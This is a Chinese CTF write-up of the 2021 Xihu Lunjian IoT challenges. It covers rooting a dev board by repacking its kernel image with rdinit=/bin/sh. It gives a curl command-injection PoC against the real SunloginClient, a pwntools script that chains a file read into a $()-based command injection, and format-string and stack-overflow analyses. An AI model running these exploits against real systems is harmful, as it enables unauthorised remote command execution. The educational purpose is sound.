# 2021西湖论剑IOT RW-WriteUp

> 原文: https://www.ctfiot.com/30841.html
> ID: 30841

海特实验室

2021年西湖论剑网络安全技能大赛圆满的落下了帷幕，在本次技能大赛中，海特实验室负责了IoT与虚实挑战区的赛制、赛题设计。本次的赛事设计秉承着贴近实战，以练促学的原则由浅到深的安排题目，覆盖了在物/车联网安全行业中常见的情景与典型的漏洞，知识点涵盖了硬件原理逆向、静态编译二进制处理分析、供应链攻击、侧信道分析原理、内核态攻防、物理总线攻防、小芯片冷门指令集逆向等先进方向，全方位的考察选手在IoT领域的知识储备与技术能力。

以下是海特实验室自研的开发版并用于本次的IoT竞赛。

请关注公众号: 网络安全研究宅基地 我们近期将举办一系列活动，在这些活动内，有机会获得比赛同款硬件攻防开发板。

简介：

本次比赛为每一位参赛选手准备了一块掌上开发板，该开发板混合了两种CPU架构：ARM924EJS与AVR，分别用于模拟Linux IoT与单片机场景。这块开发板具有丰富的外围接口设计，包括丰富的控制按钮，状态指示灯，充电电池连接器，显示屏连接器，摄像头连接器，MCU扩展连接器，蓝牙模组。板载了USB串口的设计可以大大简化了使用的复杂度，使选手更专注于题目的解答。

操作须知：

开发板的OTG口连接pc默认可以获取一个网口，用于开发板和pc通信。

开发板的UART口连接pc可以通过串口工具连接串口，波特率是115200。

开发板的RST按键可以重启设备。

每个赛题包含两个文件*.hsqs和*.hsqs.sign，将这两个文件拷贝至TF卡第一个FAT32分区的根目录下，需要保证TF卡内有且只有一道题目，将TF卡插入板子按下RST按钮（不是MCU RST）重启板子。板子启动后RUN指示灯常亮表示赛题已正确启动。LED灯闪烁查看串口输出检查故障。

板子的OTG接口可以被重编程成任意行为的USB设备，在RW题目usb_hacker内，需要选手将开发板修改为一个发送恶意USB Mass storage数据的设备对目标硬件发起攻击。

直接修改uboot的bootargs获取shell的方法已在本次比赛中通过patch封禁，选手需要使用其他方法getshell。

通过串口查看开发板启动日志可以发现开发板支持dfu协议。

在适当的时期运行dfu-util -l可以获取设备的分区信息

dfu-util 0.9Copyright 2005-2009 Weston Schmidt, Harald Welte and OpenMoko Inc.Copyright 2010-2016 Tormod Volden and Stefan SchmidtThis program is Free Software and has ABSOLUTELY NO WARRANTYPlease report bugs to http://sourceforge.net/p/dfu-util/tickets/Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=4, name="rom", serial="UNKNOWN"Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=3, name="kernel", serial="UNKNOWN"Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=2, name="env", serial="UNKNOWN"Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=1, name="u-boot", serial="UNKNOWN"Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=0, name="all", serial="UNKNOWN"

通过dfu-util -U可以获取设备kernel分区的镜像。

dfu-util -R -a kernel -U kernel.itb

通过dumpimage工具可以分析FIT Image。

dumpimage -l kernel.itbFIT description: Generic Allwinner FIT ImageCreated: Wed Mar 9 22:38:14 2022Image 0 (kernel-1)Description: Linux kernelCreated: Wed Mar 9 22:38:14 2022Type: Kernel ImageCompression: uncompressedData Size: 4579584 Bytes = 4472.25 KiB = 4.37 MiBArchitecture: ARMOS: LinuxLoad Address: 0x80000000Entry Point: 0x80000000Hash algo: sha1Hash value: 2bf3fcc2fbb60832f5449f7f15c236321c9920b5Image 1 (initrd-1)Description: Linux initrdCreated: Wed Mar 9 22:38:14 2022Type: RAMDisk ImageCompression: uncompressedData Size: 4133979 Bytes = 4037.09 KiB = 3.94 MiBArchitecture: ARMOS: LinuxLoad Address: unavailableEntry Point: unavailableHash algo: sha1Hash value: 170343129ac6eb0ce7268ecabac2aabb591c3090Image 2 (fdt-1)Description: Flattened Device Tree blobCreated: Wed Mar 9 22:38:14 2022Type: Flat Device TreeCompression: uncompressedData Size: 16195 Bytes = 15.82 KiB = 0.02 MiBArchitecture: ARMHash algo: sha1Hash value: 041dedf1ecb4dbf9f52aa5bb56bf5850c57e6aacDefault Configuration: 'conf-1'Configuration 0 (conf-1)Description: Linux Bootable FITKernel: kernel-1Init Ramdisk: initrd-1FDT: fdt-1Hash algo: crc32 Hash value: unavailable

然后通过dumpimage将kernel.itb剥离。分离出来的kernel和initrd先放一边。

dumpimage -l kernel.itb -p 0 -o kernel_1dumpimage -l kernel.itb -p 1 -o initrd_1dumpimage -l kernel.itb -p 2 -o fdt.dtbExtracted:Image 2 (fdt-1)Description: Flattened Device Tree blobCreated: Wed Mar 9 22:38:14 2022Type: Flat Device TreeCompression: uncompressedData Size: 16195 Bytes = 15.82 KiB = 0.02 MiBArchitecture: ARMHash algo: sha1 Hash value: 041dedf1ecb4dbf9f52aa5bb56bf5850c57e6aac

再用dtc工具将dtb文件变成dts文件。

dtc -I dtb -O dts fdt.dtb > fdt.dts

这时候打开fat.dts文件就可以看到设备的设备树，找到设备树的bootargs，在这里加入rdinit。

chosen {#address-cells = <0x01>;#size-cells = <0x01>; ranges; bootargs = "console=ttyS0,115200 rdinit=/bin/sh";};

然后将dts文件重新打包成dtb文件

dtc -I dts -O dtb fdt.dts >fdt.dtb

修改完dtb文件之后选手需要自己写一个its文件，这个its文件可以根据dumpimag -l 的结果写。这时候之前剥离的kernel和initrd都需要用上。

/dts-v1/;/ { description = "Generic Allwinner FIT Image";#address-cells = <1>; images { kernel-1 { description = "Linux kernel"; data = /incbin/("kernel_1");type = "kernel"; arch = "arm"; os = "linux"; compression = "none"; load = <0x80000000>; entry = <0x80000000>;hash@1 { algo = "sha1"; }; }; initrd-1 { description = "Linux initrd"; data = /incbin/("initrd_1");type = "ramdisk"; arch = "arm"; os = "linux"; compression = "none";hash@1 { algo = "sha1"; }; }; fdt-1 { description = "Flattened Device Tree blob"; data = /incbin/("fdt.dtb");type = "flat_dt"; arch = "arm"; compression = "none";hash@1 { algo = "sha1"; }; }; }; configurations { default = "conf-1"; conf-1 { description = "Linux Bootable FIT"; kernel = "kernel-1"; fdt = "fdt-1"; ramdisk="initrd-1";hash@0 { algo = "crc32"; }; }; };};

将编写的its文件编译成itb文件

mkimage -f kernel.its kernel.itb

再用dfu工具将生成的kernel.itb文件刷回板子上，这时候启动开发板就可以获取一个初始的shell。

dfu-util -R -a kernel -D kernel.itb

抹掉/etc/shadow的登陆密码然后运行/sbin/init就可以获取开发板完整的shell。

题目实现了一套mqtt通信的程序，在连接到目标服务的9990端口之后，会有一个提示publish me：

此题考查了选手对mosquitto_pub开源工具的用法，直接用改命令发布一个名称为2022/hatlab/flag的topic，mesasge为oiU7m9ipyqFdzkUFb1vfkabZ7IqiAefslrc3ovql2dA=的内容即可，在原输出信息中就会回显flag：

poc:

mosquitto_pub -t 2022/hatlab/flag -h IP -m "oiU7m9ipyqFdzkUFb1vfkabZ7IqiAefslrc3ovql2dA="

软件的版本为11.0.0.36662，通过官网的信息可知，为旧版本软件。根据提示可知道考察的点和前段时间爆出的命令注入漏洞类似。

将deb包安装到ubuntu中，将sunloginclient加载进IDA中，定位到sub_BF464C函数中，该函数主要是将web端口服务的路由和处理函数对应起来，如当访问getfastcode路径时，会调用sub_BFD9A2函数：

当访问projection时，调用了sub_BFDC50函数，函数代码如下：

__int64 __fastcall sub_BFDC50(__int64 a1, __int64 a2){ __int64 v2; // rax __int64 v3; // rax __int64 v4; // rax __int64 v6; // raxint v8; // [rsp+1Ch] [rbp-114h]char v9[16]; // [rsp+20h] [rbp-110h] BYREFchar v10[16]; // [rsp+30h] [rbp-100h] BYREFchar v11[16]; // [rsp+40h] [rbp-F0h] BYREFchar v12[16]; // [rsp+50h] [rbp-E0h] BYREFchar v13[16]; // [rsp+60h] [rbp-D0h] BYREFchar v14[16]; // [rsp+70h] [rbp-C0h] BYREFchar v15[16]; // [rsp+80h] [rbp-B0h] BYREFchar v16[16]; // [rsp+90h] [rbp-A0h] BYREFchar v17[16]; // [rsp+A0h] [rbp-90h] BYREFchar v18[16]; // [rsp+B0h] [rbp-80h] BYREFchar v19[16]; // [rsp+C0h] [rbp-70h] BYREFchar v20[16]; // [rsp+D0h] [rbp-60h] BYREF _QWORD v21[10]; // [rsp+E0h] [rbp-50h] BYREF sub_7F07A4(v21);if ( sub_8403F8(a2) == 2 ) {std::allocator<char>::allocator(v20); v2 = (*(*a2 + 56LL))(a2);std::string::string(v9, v2, v20); sub_7F0840(v21, v9, 1);std::string::~string(v9);std::allocator<char>::~allocator(v20); }else {std::allocator<char>::allocator(v20); v3 = sub_BED698(a2);std::string::string(v10, v3, v20); sub_7F0840(v21, v10, 1);std::string::~string(v10);std::allocator<char>::~allocator(v20); }std::string::string(v11);std::string::string(v12);std::string::string(v13);std::string::string(v14);std::allocator<char>::allocator(v20);std::string::string(v15, "action", v20); sub_770750(v21, v15, v11);std::string::~string(v15);std::allocator<char>::~allocator(v20);std::allocator<char>::allocator(v20);std::string::string(v16, "fastcode", v20); sub_770750(v21, v16, v12);std::string::~string(v16);std::allocator<char>::~allocator(v20);std::allocator<char>::allocator(v20);std::string::string(v17, "fastpwd", v20); sub_770750(v21, v17, v13);std::string::~string(v17);std::allocator<char>::~allocator(v20);std::allocator<char>::allocator(v20);std::string::string(v18, "session", v20); sub_770750(v21, v18, v14);std::string::~string(v18);std::allocator<char>::~allocator(v20);std::allocator<char>::allocator(v20);std::string::string(v19, "{"errorcode":"0","message":"projection ok"}", v20);std::allocator<char>::~allocator(v20);if ( cmp1(v11, "stop") ) { sub_BB686A(*(a1 + 232)); sub_BD1FE2(); }else { v4 = sub_BB686A(*(a1 + 232)); sub_C004C8(v4);if ( std::string::empty(v12) != 1 && std::string::empty(v13) != 1 ) { v6 = sub_BB686A(*(a1 + 232)); v8 = sub_BD1D0A(v6, v12, v13, v14);if ( v8 < 0 ) {if ( v8 == -2 )std::string::operator=(v19, "{"errorcode":"-2","message":"qr timeout"}");elsestd::string::operator=(v19, "{"errorcode":"-4","message":"projection failed"}"); } }else {std::string::operator=(v19, "{"errorcode":"-3","message":"parameter error"}"); } }std::string::string(v20, v19); sub_BF5C9E(a1, v20, 0LL);std::string::~string(v20); (*(**(a1 + 16) + 40LL))(*(a1 + 16), 0LL, 0LL, -1LL);std::string::~string(v19);std::string::~string(v14);std::string::~string(v13);std::string::~string(v12);std::string::~string(v11); sub_7F07D4(v21);return 1LL;}

此处代码获取了，action、fastcode、fastpwd、session参数的值，在下方的代码中使用std::string::empty判断了某些参数是否为空，接着将参数值传入到sub_BD1D0A函数中，跟进函数，fastpwd参数的值直接拼接到了完整的命令中，因此存在命令注入：

__int64 __fastcall sub_BD1D0A(__int64 a1, __int64 a2, __int64 a3, std::string *a4){unsigned int v5; // ebx __int64 v6; // rax __int64 v7; // rax __int64 v8; // rax __int64 v9; // raxconst char *v10; // rax __int64 v11; // rbxvoid (__fastcall *v12)(__int64, char *); // r12char v16[16]; // [rsp+30h] [rbp-3B0h] BYREFchar v17[16]; // [rsp+40h] [rbp-3A0h] BYREFchar v18[352]; // [rsp+50h] [rbp-390h] BYREFchar buf[256]; // [rsp+1B0h] [rbp-230h] BYREFint v20; // [rsp+2B0h] [rbp-130h]char s[256]; // [rsp+2C0h] [rbp-120h] BYREFint v22; // [rsp+3C0h] [rbp-20h]unsigned __int64 v23; // [rsp+3C8h] [rbp-18h]
 v23 = __readfsqword(0x28u);if ( std::string::empty(a4) != 1 && sub_47D427(a1 + 6680, a4) )return -2;std::ostringstream::basic_ostringstream(v18, 16LL); v6 = std::operator<<<std::char_traits<char>>(v18, " --mod=fastcontrol --fastcode=""); v7 = std::operator<<<char>(v6, a2); v8 = std::operator<<<std::char_traits<char>>(v7, "" --pwd=""); v9 = std::operator<<<char>(v8, a3);std::operator<<<std::char_traits<char>>(v9, "" --projection=1");memset(buf, 0, sizeof(buf)); v20 = 0; readlink("/proc/self/exe", buf, 0x104uLL);memset(s, 0, sizeof(s)); v22 = 0;std::ostringstream::str(v16, v18); v10 = std::string::c_str(v16);sprintf(s, ""%s" %s", buf, v10);std::string::~string(v16);if ( sub_60A256(a1 + 4952) ) { v11 = sub_60A268(a1 + 4952); v12 = *(*v11 + 232LL);std::allocator<char>::allocator(v16);std::string::string(v17, s, v16); v12(v11, v17);std::string::~string(v17);std::allocator<char>::~allocator(v16); } v5 = 0;std::ostringstream::~ostringstream(v18);return v5;}

使用动态调试在此处下断点，就很容易看到命令注入的位置。

POC：

#!/bin/bashIP=$1PORT=$2CMD=$3
curl -i -s -k -X $'GET' -H $'Host: 10.100.100.5:49496' "http://$IP:$PORT/projection?action=stop1&fastcode=12&fastpwd=2";$3;"" > /dev/null
echo "OK"

本题自定义了一种通信协议格式，涉及漏洞为文件读取和命令注入，难点主要在于静态编译程序的分析，选手需要通过调试理清协议格式，然后利用漏洞读取到包含用户名和密码的配置文件，使用账户登录后调用命令注入功能获取到 flag。

1. 恢复部分符号

程序是静态编译的，直接分析难度较大，我们考虑首先恢复部分符号信息，方便后续分析。

恢复符号的方法有很多，比较简单的方式先从板子上拿到 libc.so 链接库文件，然后使用 bindiff 导入符号表恢复部分函数信息。

首先从板子上下载到 libc-2.30.so 文件，将题目和 so 分别导入 IDA 分析，得到 IDB 文件，然后利用 bindiff 插件比较两者，并导入相似值在 0.80 以上的符号信息。

接着搜索程序中的字符串，在字符串中可以看到一些和 json 相关的信息

猜测程序使用了开源 json 解析代码，此时可以选择程序中某些字符串去 github 中尝查找，例如我们搜索

"decoding failed with codepoint"

找到包含此字符串的代码，其中第一个就是本题所使用的 json 库。

对照源代码，能够恢复另一部分函数的符号信息。

2. 调试

程序是静态编译的，可以直接在本地使用 QEMU 模拟，通过调试程序理清相关数据结构和解析逻辑。

3. 通信数据格式

在比赛中放出了和解析请求相关的函数源码，结合实际调试分析总结通信协议基本格式如下

header:+--------+---------+-----------+----------+---------+---------+| MAGIC | VERSION | TIMESTAMP | DATACRC | DATALEN | DATA |+--------+---------+-----------+----------+---------+---------+ 头部定义，MAGIC：代表一个请求的开始，固定字节序列VERSION：当前协议版本号TIMESTAMP：本次请求的时间戳DATACRC：载荷的 CRC 校验和DATALEN：载荷的长度
data:+--------+---------+------------+----------+| OPCODE | ENCFLAG | ENCSESSION | PAYLOAD |+--------+---------+------------+----------+数据部分定义，OPCODE：表示访问哪一个功能接口ENCFLAG：标识载荷数据是否加密ENCSESSION：标识当前请求在服务端对应的 sessionPAYLOAD：JSON 格式的数据

4. 请求分发逻辑

首先解析请求，然后根据 OPCODE 字段执行不同的 case 语句，Login 和 获取 LOGO 两个功能不需要鉴权，上传密钥功能不需要检查 key，其余功能都需要有合法的权限才能访问。

鉴权分为 3 个基本函数，第一个是 CRC 校验，在程序中可以通过 CRC 表找到，第二个是 enc_session 字段检查，第三个是 key 检查

CRC 检查会计算 DATA 部分的 CRC 值，然后和 header 中的 DATACRC 比较，不相等则退出。

enc_session 是登录后会设置的全局变量，检查时将 DATA 中的 ENCSESSION 字段和全局变量比较，不相等则退出。

key 是登录后用户主动设置的用于加密的数据，长度为 32 字节，key_check 函数会使用用户设置的 key 将 DATA 部分解密，如果解密失败则退出。

5. 功能定义

main 函数中能够明显的看到 switch case 结构，有 5 个分支，转移条件是协议中的 OPCODE 字段，各个功能定义

0: login 功能1: 上传密钥功能2: logout 功能3: 获取 LOGO 图片功能，此处为漏洞点 14: ping 网络诊断功能，此处为漏洞点 2

5.1 Login 功能

用于登录，用户需要提交 DATA

{"u":<username>,"p":<password>}

程序会解析出 username 和 password，然后和本地 config.ini 文件中保存的信息进行比较，相等则利用时间戳创建 enc_session 全局变量，并将 enc_session 返回给用户。验证失败则返回错误信息

5.2 上传密钥功能

用户在登录成功之后可以调用此功能，提供 DATA

{"k":<key>}

访问这个接口需要带着 Login 返回的 session 信息，检查通过后程序从 DATA 中解析出 key 信息，验证其长度后保存到全局变量 enc_key 中。

5.3 logout 功能

此功能会清除 session 和 enc_key 两个全局变量信息，和解题无关。

5.4 获取 LOGO 功能

这个功能是第一个漏洞点，访问这个接口无需任何身份验证，用户需要提交 DATA

{"d":<path>}

d 参数为需要读取的 LOGO 文件名，此接口 handler

json GetLogo::getlogo(string path){ json fail_payload; fail_payload["r"] = 0;if(path.length() >= 15){return fail_payload; }char* tmp_path = new char[100];snprintf(tmp_path, max_filename_len, logo_path_format.c_str(), path.c_str()); // BUG// open and read fileifstream cf(tmp_path);if(!cf.is_open()){return fail_payload; }string content;string buf;while(getline(cf, buf)){ content += buf; } json succ; succ["r"] = 1; succ["d"] = content;return succ;}

函数中会使用 snprintf 拼接 path 和一个固定路径，长度限制为 36 字节。

/home/iot/Desktop/Cpp/%s.png

这里可以提交如 ///config.ini 的 path 参数，拼接后得到的路径是

/home/iot/Desktop/Cpp////config.ini.png

由于长度限制的关系后续 .png 后缀会被冲洗掉，于是我们就可以得到 config.ini 配置文件中的用户名和密码信息。

5.5 ping 诊断功能

第二个漏洞点，访问这个功能需要具有合法的 session 和 key。

json Ping::ping(){ json fail_payload; fail_payload["r"] = 0;// check ip addressstring block1 = "`";string block2 = "&";string block3 = "|";string block4 = ";";string block6 = " ";string block7 = "/";if(ip_address.length() > 64){return fail_payload; }if(ip_address.find(block1) != string::npos || ip_address.find(block2) != string::npos || ip_address.find(block3) != string::npos || ip_address.find(block4) != string::npos || ip_address.find(block6) != string::npos || ip_address.find(block7) != string::npos){return fail_payload; }if(count > 10){return fail_payload; }char* cmd = new char[MAXLEN];string file_to_exec1 = "p";string file_to_exec2 = "i";string file_to_exec3 = "n";string file_to_exec4 = "g";string file_to_exec = file_to_exec1 + file_to_exec2 + file_to_exec3 + file_to_exec4;string param0 = " ";string param1 = "-";string param2 = "c";string param = param0 + param1 + param2;string tmp_format = "%d";string tmp_format2 = "%s";string tmp_cmd = file_to_exec + param + param0 + tmp_format + param0 + tmp_format2;sprintf(cmd, tmp_cmd.c_str(), count, ip_address.c_str()); system(cmd); json succ; succ["r"] = 1;return succ;}

用户提交 DATA

{"i":<ip 地址>,"c":<ping 次数>}

解析出 ip 地址和 请求次数，过滤 ip 地址参数中和命令注入相关的字符，但是过滤时缺少对 $() 的检查，后续拼接 ping 命令后直接带入 system 执行，存在命令注入漏洞。

5.6 数据加密

加密使用了一个简单的 BASE64 和 异或算法

int do_enc_dec(char* buf, unsigned int length){if(enc_key.length() != 32){return FAIL; }if(length >= MAXLEN){return FAIL; }int i = 0, j = 0;while(1){if(i >= length){break; }if(j >= 32){ j = 0; } buf[i] = buf[i] ^ enc_key.c_str()[j]; i++; j++; }return SUCCESS;}

首先程序会对 DATA 部分进行 base64 解码，然后通过密钥和数据循环异或的算法实现解密。

6. 解题思路

首先利用获取 LOGO 功能泄露出 config.ini 文件中保存的用户名和密码信息，然后调用 Login 接口登录，得到合法的 session 信息，接着调用上传密钥功能，传入任意密钥。

构造命令注入 payload，通过异或加密和 base64 编码，调用 ping 功能，实现命令注入。

题目源码见海特实验室GitHub。

7. 解题脚本

from pwn import *import timeimport base64
crc32tab = [0x00000000, 0x77073096, 0xee0e612c, 0x990951ba,0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3,0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91,0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de,0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec,0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5,0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b,0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940,0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116,0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f,0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d,0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a,0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818,0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01,0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457,0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c,0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2,0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb,0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9,0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086,0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4,0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad,0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683,0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8,0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe,0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7,0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5,0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252,0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60,0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79,0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f,0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04,0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a,0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713,0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21,0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e,0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c,0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45,0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db,0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0,0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6,0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf,0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d] # 0x2d02ef8d to 0x2d02ef8e
def mycrc32(data): crc = 0x0for i in range(len(data)): crc = crc32tab[(crc ^ data[i]) & 0xff] ^ (crc >> 8)return crc ^ 0xFFFFFFFF
def do_enc_dec(data, key): i = 0 j = 0 length = len(data) res = bytearray(length) while True:if i >= length:breakif j >= 32: j = 0 res[i] = data[i] ^ ord(key[j]) i += 1 j += 1return res
context.log_level = "DEBUG"
# p = process("./diagnose")p = remote("20.21.2.27", 50413)
# ==== get logo ====print("Leak user info")magic = b"MULBERRY"version = 1timestamp = int(time.time())opcode = 3encflag = 0encsession = 0data = b'{"d":"///config.ini"}x00'datacrc = mycrc32(data)datalen = len(data)payload3 = magic + p32(version) + p32(timestamp) + p32(datacrc) + p32(datalen) + p32(opcode) + p32(encflag) + p32(encsession) + datap.sendline(payload3)p.recvuntil(b""r":1}")
# ==== login ====print("Login")opcode = 0# data = b'{"u":"xhlj2022","p":"mysecretpasswd"}x00' # login successdata = b'{"u":"xhlj2022","p":"C4nY0uGu3ssmE?"}x00' # login successdatacrc = mycrc32(data)datalen = len(data)payload = magic + p32(version) + p32(timestamp) + p32(datacrc) + p32(datalen) + p32(opcode) + p32(encflag) + p32(encsession) + datap.sendline(payload)p.recvuntil(b""e":")timestamp = int(p.recvuntil(b",")[:-1])print(timestamp)p.recv()
# ==== put key ====print("Upload key")opcode = 1data = b'{"k":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}x00'datalen = len(data)datacrc = mycrc32(data)encsession = timestampencflag = 1payload2 = magic + p32(version) + p32(timestamp) + p32(datacrc) + p32(datalen) + p32(opcode) + p32(encflag) + p32(encsession) + datap.sendline(payload2)p.recvuntil(b""r":1}")
# # === ping ===print("Start HTTP server")opcode = 4data = b'{"k":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","i":"$(python$IFS-m${IFS}http.server$IFS-d$IFS${PATH:0:1})","c":4}x00'data = base64.b64encode(do_enc_dec(data, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))datalen = len(data)datacrc = mycrc32(data)encsession = timestampencflag = 1payload2 = magic + p32(version) + p32(timestamp) + p32(datacrc) + p32(datalen) + p32(opcode) + p32(encflag) + p32(encsession) + datap.sendline(payload2)
print("Waiting for 15s")sleep(15)
print("Fetch flag")os.system("curl http://20.21.2.27:8000/flag.txt")
p.interactive()

本题将真实世界的iot设备的漏洞融合到了lighttpd cgi里，考察选手固件漏洞挖掘能力和漏洞利用能力。

lighttpd服务存在两个有漏洞的cgi，其中55.cgi存在栈溢出，63.cgi存在格式化字符串漏洞。

1. 解题思路

访问两个cgi接口的前提是需要认证的，认证的uuid通过HTTP_COOKIES传递。

攻击过程为通过格式化字符串漏洞读出靶机上的uuid，然后设置HTTP_COOKIES触发栈溢出。

63.cgi 将uuid 存储在栈上面，在进行对比之前第二个 snprintf 造成了格式化字符串漏洞，多次利用%n$p泄露出完整的uuid

int sub_108C8(){char s[20]; // [sp+0h] [bp-54h] BYREFchar s2[20]; // [sp+14h] [bp-40h] BYREFchar haystack[24]; // [sp+28h] [bp-2Ch] BYREFchar *format; // [sp+40h] [bp-14h]char *v5; // [sp+44h] [bp-10h]char *v6; // [sp+48h] [bp-Ch]int v7; // [sp+4Ch] [bp-8h]
 v7 = 0; v6 = getenv("HTTP_COOKIES");memset(s, 0, 0x11u); sub_107E8(s);if ( v6 ) {memset(haystack, 0, 0x17u);snprintf(haystack, 0x16u, "%s", v6); v5 = strstr(haystack, "uuid=");if ( v5 ) { format = v5 + 5;memset(s2, 0, 0x11u);snprintf(s2, 0x11u, v5 + 5); // bugputs(s2);if ( !strncmp(s, s2, 0x10u) ) v7 = 1; } }return v7;}char *__fastcall sub_107E8(char *a1){char *result; // r0char s[24]; // [sp+Ch] [bp-28h] BYREFchar *v4; // [sp+24h] [bp-10h]char *v5; // [sp+28h] [bp-Ch] FILE *stream; // [sp+2Ch] [bp-8h]
memset(s, 0, 0x17u); stream = fopen("/var/tmp/session", "r");if ( !stream ) {printf("No Session");exit(1); } fgets(s, 22, stream); fclose(stream); result = strstr(s, "uuid="); v5 = result;if ( result ) { v4 = v5 + 5;snprintf(s, 0x11u, "%s", v5 + 5); result = strncpy(a1, s, 0x10u); }return result;

55.cgi在处理POST请求时，post_data 前四个字节为标志位，接着五个字节代表着size，size位全置为xff 时，

sub_10AFC函数里面strncpy会发生栈溢出。

char *__fastcall sub_10B48(char *result){unsigned __int8 *s1; // [sp+4h] [bp-D20h]char v2[3316]; // [sp+Ch] [bp-D18h] BYREFchar *v3; // [sp+D00h] [bp-24h]char *v4; // [sp+D04h] [bp-20h]size_t v5; // [sp+D08h] [bp-1Ch]int v6; // [sp+D0Ch] [bp-18h]size_t n; // [sp+D10h] [bp-14h]int v8; // [sp+D14h] [bp-10h]int v9; // [sp+D18h] [bp-Ch]char *s2; // [sp+D1Ch] [bp-8h]
 s1 = (unsigned __int8 *)result; s2 = "*#$^";if ( result ) {if ( !strncmp(result, s2, 4u) ) { v9 = s1[4]; v8 = s1[5] + 2 * v9; n = s1[6] + 4 * v8; v6 = s1[7]; v5 = s1[8] + 2 * v6;memset(v2, 0, sizeof(v2));memcpy(v2, s1, n); result = strstr(v2, "*#$^"); v4 = result;if ( result ) { v3 = &v4[v5 - 0x4D];if ( *v3 ) result = sub_10AFC(v3, v5); } }else { result = strstr(v2, "ping");if ( result ) result = (char *)sub_109B0("20.21.2.26"); } }return result;}

sub_10AFC函数返回时, 由于r0正好指向栈上可控区域，所以直接跳system即可

char *__fastcall sub_10AFC(char *result, size_t a2){ char dest[752]; // [sp+Ch] [bp-2F8h] BYREF size_t n; // [sp+2FCh] [bp-8h]
 n = a2; if ( result ) result = strncpy(dest, result, n); // bug return result;}
